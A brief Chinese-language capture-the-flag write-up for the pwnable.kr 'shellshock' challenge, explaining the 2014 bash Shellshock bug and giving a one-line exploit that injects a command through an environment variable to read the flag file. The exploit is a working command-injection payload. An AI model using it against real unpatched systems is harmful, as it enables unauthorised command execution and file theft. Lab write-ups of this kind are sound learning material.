# pwnkr shellshock
1. 這是出現在 2014 年的 10 級漏洞，針對 4.3 版本以下的 bash，原理是在執行 bash 的時候，會遍歷每個環境變數
2. env x='() { :;}; /bin/sh -c "cat flag"' ./shellshock
3. 我們定義的 x 繞過了 export 函數的定義檢查，讓後面的指令可以被執行
